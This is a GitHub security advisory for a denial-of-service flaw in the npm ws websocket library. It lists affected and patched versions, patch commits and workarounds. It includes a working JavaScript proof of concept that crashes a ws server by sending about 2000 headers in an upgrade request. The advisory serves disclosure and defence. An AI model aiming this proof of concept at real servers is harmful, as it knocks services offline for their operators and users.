# DoS when handling a request with many HTTP headers

High

[lpinca](/lpinca)
published
GHSA-3h5v-q93c-6h6q
Jun 16, 2024

## Package

npm

ws
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

>= 2.1.0 < 5.2.4, >= 6.0.0 < 6.2.3, >= 7.0.0 < 7.5.10, >= 8.0.0 < 8.17.1

## Patched versions

5.2.4, 6.2.3, 7.5.10, 8.17.1

## Description

### Impact

A request with a number of headers exceeding the[`server.maxHeadersCount`](https://nodejs.org/api/http.html#servermaxheaderscount) threshold could be used to crash a ws server.

### Proof of concept

```
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```
### Patches

The vulnerability was fixed in ws@8.17.1 ([e55e510](https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c)) and backported to ws@7.5.10 ([22c2876](https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f)), ws@6.2.3 ([eeb76d3](https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63)), and ws@5.2.4 ([4abd8f6](https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e))

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`](https://nodejs.org/api/cli.html#--max-http-header-sizesize) and/or the [`maxHeaderSize`](https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener) options so that no more headers than the `server.maxHeadersCount` limit can be sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.
